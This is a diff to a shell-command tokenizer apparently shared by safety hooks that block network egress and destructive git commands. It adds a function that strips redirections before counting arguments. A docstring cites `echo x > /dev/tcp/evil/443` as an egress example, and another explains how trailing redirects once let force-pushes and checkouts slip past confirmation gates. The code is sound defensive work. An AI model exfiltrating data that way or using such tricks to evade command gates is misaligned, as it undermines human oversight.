@@ -65,6 +65,11 @@ OPERATOR_RE = re.compile(r"^[;|&]+$")
 # Fallback splitter used only when shlex can't tokenize a line (unbalanced quotes) — best effort.
 SPLIT_RE = re.compile(r"&&|\|\||[;|&]")
 
+# Redirection operator tokens `_split_pieces()` can see, given PUNCT groups any adjacent run of
+# `;|&<>()` into one shlex token (#359): plain `<`/`>`, doubled/appended forms (`>>`, `<<`,
+# `<<<`), and the fd-duplication/combined-stream forms (`<&`, `>&`, `&>`, `&>>`, `<>`, `>|`).
+REDIRECT_OPS = {"<", ">", ">>", "<<", "<<<", "<&", ">&", "&>", "&>>", "<>", ">|"}
+
 # Leading tokens that merely group/subshell a command; skip them to reach the real command word.
 LEADING_NOISE = {"(", "{", "!"}
 
@@ -194,6 +199,14 @@ def _split_pieces(command):
     gates in block-destructive-git.py/block-checkout-held-branch.py), silently changing the count
     and skipping the confirmation. `((`/`))` (arithmetic) tokenize as their own two-char token, not
     a bare `(`/`)`, so arithmetic expressions are untouched by this filter.
+
+    Redirection operators (`<`, `>`, `2>&1`, ...) and their targets are deliberately left in the
+    yielded argv, same as always — block-egress.py's own `/dev/tcp` scan (#115) reads a redirect
+    TARGET token out of this same argv, so stripping it here would hide `echo x > /dev/tcp/evil/443`
+    from that rail. A caller that instead needs a clean POSITIONAL COUNT (block-destructive-git.py,
+    block-checkout-held-branch.py) must call `strip_redirects()` on its own argv first (#359) —
+    same "shared helper, not baked into the base tokenizer" shape as `strip_prefixes()`, since
+    different rails read this argv for different things.
     """
     for line in command.split("\n"):
         if not line.strip():
@@ -219,6 +232,44 @@ def _split_pieces(command):
                 argv.append(tok)
         if argv:
             yield argv
+
+
+def strip_redirects(argv):
+    """Return `argv` with every redirection operator (`REDIRECT_OPS` — `<`, `>`, `2>&1`, ...) and
+    its target/delimiter word removed, plus a bare leading fd-number token immediately before a
+    `<`/`>`-led operator (the `2` in `2>&1`) (#359).
+
+    `_split_pieces()`/`pieces()` deliberately leave redirects in their yielded argv (block-egress.py
+    needs to see a redirect's target to catch `/dev/tcp` egress) — but a caller that instead reads
+    argv for a POSITIONAL COUNT (`git push`'s `len(positionals) > 2` conservative-allow gate in
+    block-destructive-git.py, `checkout_target()`'s `len(positionals) != 1` in
+    block-checkout-held-branch.py) must not let a redirect's operator/target/fd-prefix ride along as
+    if they were ordinary command arguments — that's exactly how a trailing `> push.log 2>&1` on a
+    force-push, or `> /tmp/out` on a checkout, previously inflated the count past these gates and
+    silently defeated them. Call this AFTER `strip_prefixes()`/`git_subcommand()`, on the `rest`
+    argv whose positionals are about to be counted, not on a raw `pieces()` argv.
+
+    The leading-fd-number heuristic can't distinguish `2>&1` (digit IS the fd prefix) from `echo 2
+    > file` (digit is a genuine positional that merely precedes an unrelated redirect with a space
+    in between) — both tokenize identically once shlex has discarded that whitespace, unlike
+    block-suppressed-stderr.py's own raw-string regex, which checks that adjacency directly. Every
+    caller here only ever gates on `len(positionals)`, so at worst this drops one real positional,
+    shrinking the count — trading a rare false block for closing the real bypass this guards
+    against, never the other way around."""
+    out = []
+    i, n = 0, len(argv)
+    while i < n:
+        tok = argv[i]
+        if tok in REDIRECT_OPS:
+            if tok[0] in "<>" and out and out[-1].isdigit():
+                out.pop()  # leading fd number consumed by the redirect operator
+            i += 1  # drop the operator itself
+            if i < n:
+                i += 1  # drop its target/delimiter word too
+        else:
+            out.append(tok)
+            i += 1
+    return out
 
 
 def substitution_inners(command):
